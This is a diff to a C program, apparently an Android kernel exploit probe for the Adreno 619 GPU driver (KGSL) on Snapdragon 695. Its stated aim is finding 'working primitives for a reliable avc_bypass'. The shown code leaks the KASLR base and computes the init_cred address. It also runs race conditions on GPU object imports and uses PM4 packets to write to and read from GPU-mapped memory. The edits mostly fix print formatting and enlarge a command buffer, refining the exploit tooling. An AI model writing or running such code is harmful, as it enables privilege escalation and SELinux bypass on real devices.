@@ -1,8 +1,17 @@
+/*
+ * kgsl_test_analyzer.c - KGSL/Adreno 619 low-level probe
+ * Build: aarch64-linux-android-gcc -static -o kgsl_test_analyzer kgsl_test_analyzer.c -lpthread
+ *
+ * Tests all relevant ioctls and PM4 packets to determine working primitives
+ * for a reliable avc_bypass on Snapdragon 695 (Adreno 619).
+ */
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
 #include <stdbool.h>
+#include <stdarg.h>
 #include <fcntl.h>
 #include <unistd.h>
 #include <errno.h>
@@ -84,7 +93,6 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define CP_REG_TO_MEM  0x3E
 #define CP_MEM_TO_REG  0x42
 #define CP_WAIT_REG_MEM 0x3C
-#define CP_INDIRECT_BUFFER_PFD 0x37 /* type3 */
 
 /* ========================== Global state ========================== */
 static int kgsl_fd = -1;
@@ -283,7 +291,6 @@ static void test_import_params(void) {
     };
     size_t sizes[] = {sizeof(user_buf), 0x1000, 0x1000, 0x1000};
     uint64_t flags[] = {KGSL_MEMFLAGS_USE_CPU_MAP, KGSL_MEMFLAGS_USE_CPU_MAP, 0, 0};
-    int types[] = {KGSL_USER_MEM_TYPE_ADDR, KGSL_USER_MEM_TYPE_ADDR, KGSL_USER_MEM_TYPE_ADDR, KGSL_USER_MEM_TYPE_DMABUF};
 
     for (int i = 0; i < 4; i++) {
         struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = addrs[i] };
@@ -291,11 +298,12 @@ static void test_import_params(void) {
             .priv = (uint64_t)&uaddr,
             .priv_len = sizes[i],
             .flags = flags[i],
-            .type = types[i],
+            .type = KGSL_USER_MEM_TYPE_ADDR,
         };
         int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
         printf("  test%d: addr=0x%lx size=%zu flags=0x%llx type=%d => ret=%d errno=%d",
-               i, addrs[i], sizes[i], flags[i], types[i], ret, ret<0?errno:0);
+               i, (unsigned long)addrs[i], sizes[i], (unsigned long long)flags[i],
+               KGSL_USER_MEM_TYPE_ADDR, ret, ret<0?errno:0);
         if (ret == 0) {
             printf(" id=%u\n", imp.id);
             gpuobj_free(imp.id);
@@ -313,7 +321,7 @@ static void test_pm4_packets(uint64_t ib_ga, void *ib_m, uint64_t dst_ga, void *
     /* 1. CP_MEM_WRITE */
     printf("  CP_MEM_WRITE: ");
     uint64_t test_val = 0xCAFEBABEDEADBEEFULL;
-    uint32_t cmd[16];
+    uint32_t cmd[32];
     int dw = 0;
     uint32_t lo, hi;
     split64(dst_ga, &lo, &hi);
@@ -327,7 +335,7 @@ static void test_pm4_packets(uint64_t ib_ga, void *ib_m, uint64_t dst_ga, void *
     if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0) {
         flush_dc_civac_range(dst_m, 16);
         uint64_t got = *(uint64_t*)dst_m;
-        printf("got=0x%016lx %s\n", got, got==test_val ? "[OK]" : "[FAIL]");
+        printf("got=0x%016lx %s\n", (unsigned long)got, got==test_val ? "[OK]" : "[FAIL]");
     } else {
         printf("failed\n");
     }
@@ -347,7 +355,7 @@ static void test_pm4_packets(uint64_t ib_ga, void *ib_m, uint64_t dst_ga, void *
         if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0) {
             flush_dc_civac_range(dst_m, 16);
             uint64_t val = *(uint64_t*)dst_m;
-            printf("reg=0x%04x => 0x%016lx ", regs[i], val);
+            printf("reg=0x%04x => 0x%016lx ", regs[i], (unsigned long)val);
         } else {
             printf("reg=0x%04x => failed ", regs[i]);
         }
@@ -378,7 +386,7 @@ static void test_pm4_packets(uint64_t ib_ga, void *ib_m, uint64_t dst_ga, void *
         if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0) {
             flush_dc_civac_range(dst_m, 16);
             uint64_t val = *(uint64_t*)(dst_m + 8);
-            printf("readback=0x%016lx %s\n", val, val != 0 ? "[READABLE]" : "[ZERO]");
+            printf("readback=0x%016lx %s\n", (unsigned long)val, val != 0 ? "[READABLE]" : "[ZERO]");
         } else {
             printf("readback failed\n");
         }
@@ -462,7 +470,7 @@ static int run_race_pattern(int pattern, uint64_t alloc_flags) {
     if (ov_id < 0) return 0;
     uint64_t ov_gpuaddr = 0;
     gpuobj_info(ov_id, &ov_gpuaddr, NULL);
-    printf("  pattern %d: ov_id=%d ov_gpuaddr=0x%lx\n", pattern, ov_id, ov_gpuaddr);
+    printf("  pattern %d: ov_id=%d ov_gpuaddr=0x%lx\n", pattern, ov_id, (unsigned long)ov_gpuaddr);
 
     switch(pattern) {
         case 0: pthread_create(&thr, NULL, race_thread_import, NULL); break;
@@ -510,9 +518,9 @@ int main(int argc, char **argv) {
         close(kgsl_fd);
         return 1;
     }
-    printf("[+] KASLR = 0x%lx\n", kaslr);
+    printf("[+] KASLR = 0x%lx\n", (unsigned long)kaslr);
     init_cred_addr = kaslr + VMLINUX_INIT_CRED_OFFSET;
-    printf("[*] init_cred = 0x%lx\n", init_cred_addr);
+    printf("[*] init_cred = 0x%lx\n", (unsigned long)init_cred_addr);
 
     /* Test dc civac */
     try_dc_civac((void*)&kgsl_fd);
@@ -526,7 +534,7 @@ int main(int argc, char **argv) {
     if (!ib_m) die("ib mmap");
     uint64_t ib_ga = 0;
     gpuobj_info(ib_id, &ib_ga, NULL);
-    printf("[*] IB: id=%d gpuaddr=0x%lx\n", ib_id, ib_ga);
+    printf("[*] IB: id=%d gpuaddr=0x%lx\n", ib_id, (unsigned long)ib_ga);
 
     int dst_id = gpuobj_alloc(0x4000, alloc_flags);
     if (dst_id < 0) die("dst alloc");
@@ -534,7 +542,7 @@ int main(int argc, char **argv) {
     if (!dst_m) die("dst mmap");
     uint64_t dst_ga = 0;
     gpuobj_info(dst_id, &dst_ga, NULL);
-    printf("[*] DST: id=%d gpuaddr=0x%lx\n", dst_id, dst_ga);
+    printf("[*] DST: id=%d gpuaddr=0x%lx\n", dst_id, (unsigned long)dst_ga);
 
     unsigned int ctx_id = create_context();
     printf("[*] Context: %u\n", ctx_id);
